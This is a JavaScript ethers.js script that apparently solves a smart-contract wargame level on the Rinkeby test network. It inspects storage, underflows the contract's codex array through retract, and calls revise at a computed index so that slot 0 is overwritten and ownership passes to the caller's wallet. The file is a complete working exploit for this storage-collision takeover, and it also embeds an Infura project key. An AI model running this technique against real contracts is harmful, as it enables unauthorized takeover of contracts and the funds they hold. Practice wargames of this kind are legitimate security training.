const { ethers } = require("ethers");
require("dotenv").config();
const ABI = require("./ABI.json");

let provider = ethers.providers.getDefaultProvider("rinkeby");
provider = new ethers.providers.JsonRpcProvider(
    "https://rinkeby.infura.io/v3/27329cef779644bbb38f91c985e66b9e"
);

const contractAddress = "0x9C0b98d97C8e3f326747a065eF82951C321E9e2E";
const contract = new ethers.Contract(contractAddress, ABI, provider);

const privateKey = process.env.PRIVATEKEY;
const wallet = new ethers.Wallet(privateKey, provider);

const contractWithSigner = contract.connect(wallet);

const recon = async () => {
    for (let i = 0; i<5; i++) {
        const result = await provider.getStorageAt(contractAddress, i);
        console.log(result);
    }
}

const checkOwner = async () => {
    const result = await contractWithSigner.owner();
    console.log(result);
}

const makeContact = async () => {
    const tx = await contractWithSigner.make_contact();
    await provider.waitForTransaction(tx.hash);
    await recon();
}

const retract = async () => {
    const tx = await contractWithSigner.retract();
    await provider.waitForTransaction(tx.hash);
    await recon();
}

const overWriteOwner = async () => {
    const codexLoc = ethers.BigNumber.from(
        ethers.utils.solidityKeccak256(["uint256"], [1])
    );
    const overWriteLoc = ethers.constants.MaxUint256.sub(codexLoc).add(1);
    const addressBytes = ethers.utils.hexZeroPad(wallet.address, 32);
    console.log(addressBytes);
    const tx = await contractWithSigner.revise(overWriteLoc, addressBytes);
    await provider.waitForTransaction(tx.hash);
    await recon();
}

// recon(); // check for storage variables
// checkOwner(); // check whether owner is stored at slot 0
// makeContact(); // contact bool is stored at slot0 as well
// retract(); // checks that codex is stored at slot1, and underflows codex array
overWriteOwner();
